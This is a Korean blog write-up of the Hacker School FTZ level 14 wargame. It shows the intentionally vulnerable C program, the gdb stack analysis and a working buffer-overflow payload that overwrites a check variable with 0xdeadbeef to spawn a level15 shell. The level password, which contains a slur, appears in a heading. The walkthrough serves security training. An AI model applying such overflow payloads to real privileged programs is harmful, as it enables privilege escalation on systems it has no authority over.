---
layout: post
title: "Hacker School FTZ - Level 14"
description: "Do you know the canary (2)?"
comments: true
categories: ftz
---

<img data-action="zoom" src='{{ "assets/ftz/level14/1.jpg" | relative_url }}' alt='relative'>  

## 1) level14/what that nigga want? 입력해 로그인  

<img data-action="zoom" src='{{ "assets/ftz/level14/2.png" | relative_url }}' alt='relative'>  

``` c
// attackme 프로그램의 소스파일
#include <stdio.h>
#include <unistd.h>

main()
{ int crap;
  int check;
  char buf[20];
  fgets(buf,45,stdin);
  if (check==0xdeadbeef)
   {
     setreuid(3095,3095);
     system("/bin/sh");
   }
}
```

이번에도 attackme 프로그램을 실행시켜 버퍼 오버플로우를 일으켜 shell을 획득하는 문제로 보입니다.  
/tmp 디렉토리에 힌트에 적힌 소스코드를 복사해 파일을 하나 만듭니다.  
(저의 경우 소스코드는 at.c 파일명으로 저장했으며, 실행파일의 이름은 at로 지정했습니다.)  

그다음 gdb로 돌려 스택의 구성을 살펴보겠습니다.  

## 2) 해당 소스코드의 스택 구조 파악하기  

<img data-action="zoom" src='{{ "assets/ftz/level14/3.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/ftz/level14/4.png" | relative_url }}' alt='relative'>  

어셈블리어 코드를 보면 그림과 같이 스택이 구성되어 있다는 것을 알 수 있습니다.  


사용자에게 문자열을 입력받은 뒤, &\[ebp-16\] 주소에 0xdeadbeef이 저장되어 있는지 확인하는 코드에서 브레이크를 걸고 실행해봅니다.  

``` bash
b *main+48
r <<< $(python -c 'print "\x90"*40+"\xef\xbe\xad\xde"')
```  

<img data-action="zoom" src='{{ "assets/ftz/level14/5.png" | relative_url }}' alt='relative'>  

입력한 내용과 같이 buf 배열의 길이는 20이지만 버퍼 오버플로우가 발생하여 사용자가 입력한 문자열 45 byte(문자열의 끝을 의미하는 NULL까지 더한 값) 모두 스택에 저장되어 있는 것을 볼 수 있습니다.  

<img data-action="zoom" src='{{ "assets/ftz/level14/6.png" | relative_url }}' alt='relative'>  

``` bash
(python -c 'print "\x90"*40+"\xef\xbe\xad\xde"'; cat) | ./at
```

at 프로그램에 적용해보면 shell이 실행되는 것을 볼 수 있습니다.  

## 3) attackme 프로그램에 버퍼 오버플로우 일으키기  

<img data-action="zoom" src='{{ "assets/ftz/level14/7.png" | relative_url }}' alt='relative'>  

``` bash
(python -c 'print "\x90"*40+"\xef\xbe\xad\xde"'; cat) | ./attackme
```

attackme 프로그램에 적용해 level15 권한으로 shell을 실행시켰으며 level15의 비밀번호를 획득했습니다.  